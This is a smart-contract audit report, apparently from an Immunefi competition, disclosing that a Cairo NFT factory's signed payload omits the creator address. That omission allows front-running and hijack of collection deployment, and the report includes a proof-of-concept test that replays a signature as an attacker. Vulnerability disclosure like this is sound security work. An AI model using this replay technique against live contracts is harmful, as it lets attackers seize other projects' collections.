# 57089 sc medium unauthorized collection hijack via unsigned creator

**Submitted on Oct 23rd 2025 at 11:40:28 UTC by @OxPrince for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57089
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nftfactory/nftfactory.cairohttps://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nftfactory/nftfactory.cairo>
* **Impacts:** Unauthorized minting of NFTs

## Description

## Brief/Intro

`NFTFactory.produce` lets anyone supply a signed payload to deploy a new NFT collection. The off-chain signer is supposed to authorize a specific creator off-chain, but the message that gets signed does not include the intended creator’s address. As a result, the contract never verifies that the caller is the party that the signer approved.

## Vulnerability Details

{% stepper %}
{% step %}

### Step: Signed message composition

The message that must be signed only includes `name_hash`, `symbol_hash`, `contract_uri`, and `royalty_fraction` (`src/snip12/produce_hash.cairo:5-28`). There is no field tying the signature to a specific caller.
{% endstep %}

{% step %}

### Step: On-chain storage and `creator` assignment

When the transaction executes, `_produce` stores `get_caller_address()` as the new collection’s `creator` and permanently marks the `(name_hash, symbol_hash)` pair as used (`src/nftfactory/nftfactory.cairo:253-354`).
{% endstep %}

{% step %}

### Step: Exploitation via front-running / signature replay

Because the signature is caller-agnostic, any address that observes or obtains the signature can front-run the intended owner and call `produce` first. The signature check passes, the attacker becomes the recorded `creator`, and the legitimate user is permanently blocked by the `NFT_EXISTS` guard.

Note: The comment in the hash function (“This can be a field within the struct, it doesn't have to be `get_caller_address()`”) signals the developer intent to bind some actor to the signature, but that intent was never implemented.
{% endstep %}
{% endstepper %}

## Impact Details

An attacker who copies an authorized payload—e.g., by front-running the intended transaction—can:

* Deploy the collection under their own address.
* Control the newly deployed NFT contract and any referral proceeds.
* Prevent the real creator from ever deploying the same collection name/symbol.

This breaks the trust model of the factory and results in total loss of control for the legitimate project team.

## References

Add any relevant links to documentation or code

## Proof of Concept

The following test demonstrates front-run hijack of the produce flow. The attacker reuses a valid signature produced for an intended creator and calls `produce` first, becoming the recorded creator and causing the legitimate creator's later attempt to revert with `NFT is already exists`.

<details>

<summary>test_nftfactory.cairo (Proof of Concept)</summary>

```rust
#[test]
#[should_panic(expected: 'NFT is already exists')]
fn test_produce_front_run_hijack() {
    let account = deploy_account_mock();
    let contract = deploy_initialize(account);
    let erc20mock = deploy_erc20_mock();

    let nft_factory = INFTFactoryDispatcher { contract_address: contract };
    let attacker = constants::REFERRAL();
    let intended_creator = constants::CREATOR();

    let fraction = 0;
    let produce_hash = ProduceHash {
        name_hash: constants::NAME().hash(),
        symbol_hash: constants::SYMBOL().hash(),
        contract_uri: constants::CONTRACT_URI().hash(),
        royalty_fraction: fraction,
    };

    start_cheat_caller_address_global(account);
    let signature = sign_message(produce_hash.get_message_hash(contract));
    stop_cheat_caller_address_global();

    let instance_info = InstanceInfo {
        name: constants::NAME(),
        symbol: constants::SYMBOL(),
        contract_uri: constants::CONTRACT_URI(),
        payment_token: erc20mock,
        royalty_fraction: fraction,
        transferrable: true,
        max_total_supply: constants::MAX_TOTAL_SUPPLY(),
        mint_price: constants::MINT_PRICE(),
        whitelisted_mint_price: constants::WL_MINT_PRICE(),
        collection_expires: constants::EXPIRES(),
        referral_code: '',
        signature,
    };

    // Attacker front-runs with the leaked signature.
    start_cheat_caller_address(contract, attacker);
    let (nft_address, _) = nft_factory.produce(instance_info.clone());
    assert_eq!(
        nft_factory.nftInfo(constants::NAME(), constants::SYMBOL()).creator,
        attacker,
    );
    assert_eq!(
        nft_factory.nftInfo(constants::NAME(), constants::SYMBOL()).nft_address,
        nft_address,
    );
    stop_cheat_caller_address(contract);

    // Legitimate creator can no longer deploy the same collection.
    start_cheat_caller_address(contract, intended_creator);
    nft_factory.produce(instance_info);
}
```

</details>
